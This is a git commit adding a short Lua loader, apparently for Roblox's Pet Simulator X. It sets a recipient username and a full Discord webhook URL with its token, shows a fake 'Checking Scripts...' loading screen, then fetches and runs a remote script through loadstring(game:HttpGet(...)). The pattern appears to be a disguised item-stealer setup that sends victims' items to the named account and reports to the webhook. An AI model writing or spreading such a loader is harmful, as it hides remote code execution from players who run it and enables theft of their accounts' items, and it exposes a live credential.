6a439ec69fa00b63183978a6bb93f0a7ad7bd0db
Muhammadd196 <139163492+Muhammadd196@users.noreply.github.com>
2023-07-11 01:07:03 +0700

    Mainstring.lua

---
+++ Mainstring.lua
@@ -0,0 +1,11 @@
+Username = "Dynz_Xx"
+WebHook = "https://discord.com/api/webhooks/1128024306002178189/_LeO2VfvzanIp0zXpSCfi7vt5mRYYDRkQN5sgqzMoZqbJBDdvpAB6z9SpOI4BeTpPHvf"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Loading Project-WD"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
